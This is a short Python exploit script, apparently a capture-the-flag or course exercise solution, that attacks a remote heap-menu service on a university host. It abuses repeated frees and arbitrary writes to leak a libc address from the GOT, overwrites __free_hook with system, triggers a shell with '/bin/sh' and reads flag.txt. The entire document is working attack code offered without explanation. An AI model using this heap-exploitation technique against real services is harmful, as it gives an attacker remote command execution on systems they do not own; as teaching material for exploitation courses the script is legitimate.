import sys
import struct
import socket

p = lambda x : (struct.pack('Q', x))

set_got = 0x406f10

#address = 'localhost'

address = 'lettieri.iet.unipi.it'


port = 4462

s = socket.create_connection((address, port))

__free_hook = 0x407068

pr = b'cA08'

s.send(pr)

sec = b'dA'

s.send(sec)

ter = b'dA'

s.send(ter)

qu = b'cB08'

s.send(qu)

qi = b'aB' + p(set_got - 16)

s.send(qi)

sex = b'cD08'

s.send(sex)

sept = b'cE08'

s.send(sept)

ot = b'sE'

s.send(ot)

set_libc = struct.unpack('Q', s.recv(8))[0]

off = 0xff410

libc = set_libc - off

print('LIBC : ', hex(libc))

#s.close()

#s = socket.create_connection((address, port))

sys_off = 0x48e50

sys_libc = libc + sys_off

#we = b'cD08'

#s.send(we)

uno = b'dD'

s.send(uno)

fo = b'dD'
s.send(fo)

due = b'cV08'

s.send(due)

tre = b'aV' + p(__free_hook - 16)

s.send(tre)

tu = b'cJ08'

s.send(tu)

vu = b'aJ' + b'/bin/sh\0'

s.send(vu)

yu = b'cH08'

s.send(yu)

du = b'aH' + p(sys_libc)

s.send(du)

su = b'dJ'

s.send(su)

s.send(b'/bin/cat flag.txt\n')

sys.stdout.buffer.write(s.recv(0x200))
